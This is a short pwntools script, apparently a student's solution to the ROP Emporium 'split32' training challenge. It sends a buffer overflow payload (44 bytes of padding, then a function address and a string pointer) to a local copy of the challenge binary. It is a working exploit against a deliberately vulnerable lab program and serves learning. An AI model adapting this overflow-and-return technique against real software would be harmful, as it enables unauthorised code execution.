# Eploit crafted to complete the ROP_Emporium Split32
# challenge.

from pwn import *

buffer = 44

firstadd = 0x0804861a
usestrg = 0x0804a030

payload = b"a" * buffer

payload += p32(firstadd)
payload += p32(usestrg)

#print(payload) > "/home/student/Desktop/split32playload"

Split32 = "/home/student/Desktop/split32dire/split32"
p = process(Split32)
p.send(payload)
print(p.recvall().decode('latin1'))


